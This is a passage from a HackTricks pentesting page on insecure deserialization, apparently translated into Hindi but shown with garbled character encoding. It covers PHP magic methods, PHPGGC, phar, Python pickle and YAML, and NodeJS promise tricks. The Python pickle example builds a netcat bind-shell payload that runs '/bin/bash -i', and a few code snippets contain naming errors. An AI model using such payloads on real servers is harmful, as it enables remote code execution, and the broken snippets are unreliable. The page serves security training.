# рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PR рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** **рдмрдврд╝рд╛рд╡рд╛ рджреЗрдВред**

</details>

**рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рдПрдХ рд╡рд╕реНрддреБ рдХреЛ рдПрдХ рдбреЗрдЯрд╛ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдмрджрд▓рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд▓реЛрдЧ рдЕрдХреНрд╕рд░ рд╡рд╕реНрддреБрдУрдВ рдХреЛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрдиреНрд╣реЗрдВ рд╕рдВрдЧреНрд░рд╣рдг рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛ рд╕рдХреЗ, рдпрд╛ рд╕рдВрдЪрд╛рд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛ рд╕рдХреЗред

**рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЙрд▓реНрдЯрд╛ рд╣реИ, рдЬреЛ рдХрд┐рд╕реА рдкреНрд░рд╛рд░реВрдк рд╕реЗ рд╕рдВрд░рдЪрд┐рдд рдбреЗрдЯрд╛ рдХреЛ рд▓реЗрдХрд░ рдЙрд╕реЗ рдПрдХ рд╡рд╕реНрддреБ рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрдорд╛рдг рдХрд░рддреА рд╣реИред рдЖрдЬрдХрд▓, рдбреЗрдЯрд╛ рдХреЛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рд▓реЛрдХрдкреНрд░рд┐рдп рдбреЗрдЯрд╛ рдкреНрд░рд╛рд░реВрдк JSON рд╣реИред рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ, рдпрд╣ XML рдерд╛ред

рдХрдИ рдЕрд╡рд╕рд░реЛрдВ рдореЗрдВ рдЖрдк рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдореЗрдВ рдХреБрдЫ рдХреЛрдб рдвреВрдВрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджрд┐рдП рдЧрдП рдХреБрдЫ рд╡рд╕реНрддреБ рдХреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рддрд╛ рд╣реИред\
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдк рдПрдХ рджреБрд╖реНрдЯ рдкреЗрд▓реЛрдб рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдврдВрдЧ рд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░реЗрдВред

**рдЖрдкрдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП:** [**https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html) **рдЕрдЯреИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рд╕реАрдЦреЗрдВред**

## PHP

рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЬрд╛рджреВрдИ рддрд░реАрдХреЗ:

* `__sleep` рдЬрдм рдПрдХ рд╡рд╕реНрддреБ рдХреЛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рд▓реМрдЯрдирд╛ рдЪрд╛рд╣рд┐рдП

рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЬрд╛рджреВрдИ рддрд░реАрдХреЗ

* `__wakeup` рдЬрдм рдПрдХ рд╡рд╕реНрддреБ рдХреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* `__unserialize` рдпрджрд┐ рдпрд╣ рдореМрдЬреВрдж рд╣реЛрддрд╛ рд╣реИ рддреЛ `__wakeup` рдХреЗ рдмрдЬрд╛рдп рдпрд╣ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* `__destruct` PHP рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╡рд╕реНрддреБ рдирд╖реНрдЯ рдХреА рдЬрд╛рддреА рд╣реИред
* `__toString` рд╡рд╕реНрддреБ рдХреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдЗрд╕рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдпрд╛ рдЗрд╕рдХреЗ рдЕрдВрджрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдзрд┐рдХ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
рдпрджрд┐ рдЖрдк рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреА рдУрд░ рджреЗрдЦреЗрдВ, рддреЛ рдЖрдк рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рдЬрдм рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдлрд╝рдВрдХреНрд╢рди **`__wakeup`** рдФрд░ **`__destruct`** рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдореЗрдВ рдЖрдкрдХреЛ рдорд┐рд▓реЗрдЧрд╛ рдХрд┐ рдЬрдм рдХреЛрдИ рд╡рд┐рд╢реЗрд╖рддрд╛ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **рдЕрдм рд╡рд╣ рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ**.

{% hint style="warning" %}
рдпрджрд┐ рдХрдХреНрд╖рд╛ рдореЗрдВ рдЗрд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ `__wakeup()` рдХреА рдмрдЬрд╛рдп `__unserialize(array $data)` рд╡рд┐рдзрд┐ рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЖрдкрдХреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рдПрд░реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЖрдк рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдкрд░ рдХреЛрдИ рднреА рдЖрд╡рд╢реНрдпрдХ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```php
phpCopy codeclass MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

рдЖрдк рдПрдХ рд╕рдордЭрд╛рдпрд╛ рд╣реБрдЖ **PHP рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), рдпрд╣рд╛рдВ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) рдпрд╛ рдпрд╣рд╛рдВ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP рдбрд┐рд╕реАрд░рд┐рдпрд▓ + рдСрдЯреЛрд▓реЛрдб рдХреНрд▓рд╛рд╕реЗрд╕

рдЖрдк PHP рдСрдЯреЛрд▓реЛрдб рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирд┐рдпрдорд┐рдд php рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдЕрдзрд┐рдХ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### рд╕рдВрджрд░реНрднрд┐рдд рдорд╛рдиреЛрдВ рдХреЛ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдирд╛

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рдЖрдк рдХрд┐рд╕реА рдорд╛рди рдХреЛ **рдПрдХ рдЕрдиреНрдп рдорд╛рди рдХреЗ рд╕рдВрджрд░реНрдн рдХреЗ рд░реВрдк рдореЗрдВ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (PHP рдХреЗ рд▓рд┐рдП ysoserial)

[**PHPGCC**](https://github.com/ambionics/phpggc) рдЖрдкрдХреЛ PHP рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдРрд╕рд╛ рддрд░реАрдХрд╛ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛ рдХрд┐ рдЖрдк рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реНрд░реЛрдд рдХреЛрдб рдореЗрдВ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдВ, рд▓реЗрдХрд┐рди рдЖрдк PHP рдХреЗ рдмрд╛рд╣рд░реА рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдХреЛрдб рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рддреЛ, рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗ рддреЛ, рд╕рд░реНрд╡рд░ рдХреА `phpinfo()` рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЦреЛрдЬреЗрдВ (рдФрд░ **PHPGCC** рдХреЗ **рдЧреИрдЬреЗрдЯреНрд╕** рдкрд░ рднреА) рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдЧреИрдЬреЗрдЯ рдЬрд┐рдирдХрд╛ рдЖрдк рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### phar:// рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ LFI рдЦреЛрдЬрд╛ рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрд╕рдореЗрдВ php рдХреЛрдб рдХреЛ рдирд╣реАрдВ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**file\_get\_contents(), fopen(), file() рдпрд╛ file\_exists(), md5\_file(), filemtime() рдпрд╛ filesize()**_**_ рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЖрдк **phar** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдкрдврд╝реЗрдВ:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

рдЬрдм рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЕрдирдкрд┐рдХрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдлрд╝рдВрдХреНрд╢рди _\_\_reduce\_\__ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдЧреАред\
рдЬрдм рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд░реНрд╡рд░ рдПрдХ рддреНрд░реБрдЯрд┐ рд╡рд╛рдкрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **pickle jails** рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рджреЗрдЦреЗрдВ:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **рдФрд░** jsonpickle

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рдпрд╣ рддрдХрдиреАрдХ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ **yamls** рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдореЗрдВ рдПрдХ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдПрдХ рдЙрдкрдХрд░рдг рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **Pickle, PyYAML, jsonpickle рдФрд░ ruamel.yaml** рдХреЗ рд▓рд┐рдП RCE рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### рдХрдХреНрд╖рд╛ рдкреНрд░рджреВрд╖рдг (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS рдЬрд╛рджреВрдИ рдлрд╝рдВрдХреНрд╢рди

JS **PHP рдпрд╛ рдкрд╛рдпрдерди рдХреА рддрд░рд╣ "рдЬрд╛рджреВрдИ" рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ** рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВрдЧреЗред рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдХреБрдЫ **рдлрд╝рдВрдХреНрд╢рди** рд╣реИрдВ рдЬреЛ **рд╕реАрдзреЗ рдмреБрд▓рд╛рдП рдЬрд╛рдиреЗ рдХреЗ рдмрд┐рдирд╛ рднреА рдЕрдХреНрд╕рд░ рдЙрдкрдпреЛрдЧ рд╣реЛрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ **`toString`**, **`valueOf`**, **`toJSON`**ред\
рдпрджрд┐ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЗрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ **рдЦрд╝рддрд░реЗ рдореЗрдВ рдбрд╛рд▓рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЕрдиреНрдп рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ** (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ) рддреЛ рдЬрдм рдЙрдиреНрд╣реЗрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ рдЖрдк рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХ рдФрд░ **"рдЬрд╛рджреВрдИ" рддрд░реАрдХрд╛ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рдирд╣реАрдВ рд╣реИ, рд╡рд╣ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ **рдЦрд╝рд░реАрджрдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдЕрд╕рд┐рдВрдХ рдлрд╝рдВрдХреНрд╢рди** (рдкреНрд░рдорд┐рд╕) рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐, рдпрджрд┐ рдЖрдк рдЙрд╕ **рд╡рд╛рдкрд╕реА рдСрдмреНрдЬреЗрдХреНрдЯ** рдХреЛ рдПрдХ рдФрд░ **рдкреНрд░рдорд┐рд╕** рдореЗрдВ рдмрджрд▓ рджреЗрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **"then"** рдирд╛рдордХ **рдЧреБрдг** рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдкреНрд░рдХрд╛рд░ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЗрд╕рд▓рд┐рдП **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рджреВрд╕рд░реЗ рдкреНрд░рдорд┐рд╕ рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред _рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП_ [_**рдЗрд╕ рд▓рд┐рдВрдХ**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _рдкрд░ рдЬрд╛рдПрдВред_
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` рдФрд░ `prototype` рдкреНрд░рджреВрд╖рдг

рдпрджрд┐ рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ **рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВ**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

